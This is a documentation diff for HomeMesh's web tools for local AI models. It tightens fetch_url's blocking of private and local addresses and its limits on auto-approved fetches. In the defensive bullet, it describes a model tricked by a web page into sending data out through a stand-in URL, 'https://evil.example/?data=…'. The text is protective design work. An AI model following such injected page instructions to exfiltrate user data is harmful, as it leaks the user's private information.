@@ -6,7 +6,7 @@ specific computer, and each runs on a computer you choose:
 | Tool | What it does | Runs on | Asks you first? |
 |---|---|---|---|
 | `web_search` | Searches the web through **your own SearXNG** and returns titles, links and snippets. | A computer with SearXNG (e.g. the Bazzite desktop) | No (you can make it ask, see below) |
-| `fetch_url` | Reads one public web page (HTML, text, JSON/XML or PDF) and returns its text and links. | Any computer that allows it | Only for links that neither you nor a search result supplied |
+| `fetch_url` | Reads one public web page (HTML, text, JSON/XML or PDF) and returns its text and links. | Any computer that allows it | For links you wrote: never. Search results: up to 3 per answer, one per site. Anything else: yes |
 | `open_url` | Opens an `http(s)` link in the default browser of that computer ("open YouTube"). | The computer you sit at (e.g. the Windows hub) | **Always**, showing the exact link |
 
 The model decides when to use them; it can only use tools that are allowed on a computer that is
@@ -23,17 +23,21 @@ online, and only models with tool support (the **tools** capability on the Model
 * **Never your home network.** `fetch_url` refuses every private, local and special address:
   `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, link-local (incl. `169.254.169.254`), CGNAT/Tailscale
   `100.64/10`, IPv6 local ranges, multicast and reserved ranges, and IPv4 addresses hidden inside IPv6.
-  So a model, or a web page talking to it, can't reach your router, Ollama, another HomeMesh computer
-  or a NAS. Every redirect is checked again; HomeMesh connects to exactly the address it checked (so a
+  It also refuses every address on the computer's own networks, including its *global* IPv6 network
+  (at home, the PC, the router and a NAS usually have public IPv6 addresses too). So a model, or a web
+  page talking to it, can't reach your router, Ollama, another HomeMesh computer or a NAS. One gap
+  remains: if your router answers on its own public IPv4 address from inside, HomeMesh can't know
+  that address without asking an outside service (it doesn't), so it can't block it. Every redirect is checked again; HomeMesh connects to exactly the address it checked (so a
   DNS answer that changes in between can't sneak through) while still verifying the site's HTTPS
   certificate against its real name. Only web ports are used (80, 443 and ports from 1024 up), downloads
   are limited (5 MB, 20 s, 5 redirects by default, also for compressed pages) and proxy settings from
   the environment are ignored.
 * **No silent data leaks through links.** A model that was tricked by a web page might try to send
-  your data out by fetching `https://evil.example/?data=…`. So `fetch_url` runs without asking only for
-  addresses that **you** wrote in this conversation or that an **earlier search result or fetched page**
-  contained (same host, path and query). Anything else shows an **Approve / Deny** card with the
-  reason first.
+  your data out by fetching `https://evil.example/?data=…`, or by choosing *which* of a page's links
+  to fetch. So `fetch_url` runs without asking only for addresses that **you** wrote in this
+  conversation, or that a **search result** (or an earlier fetch itself) supplied, and of those only
+  3 per answer and one per site. Links found *on* a page, changed addresses (extra path, query,
+  slashes) and everything else show an **Approve / Deny** card with the reason first.
 * **Opening links always asks.** `open_url` is an action on your desktop, so it shows the exact link
   and the computer name and waits for **Approve**. Only `http://` and `https://` links are accepted
   (never files, programs, `javascript:` or Windows settings links), and links into your own network are
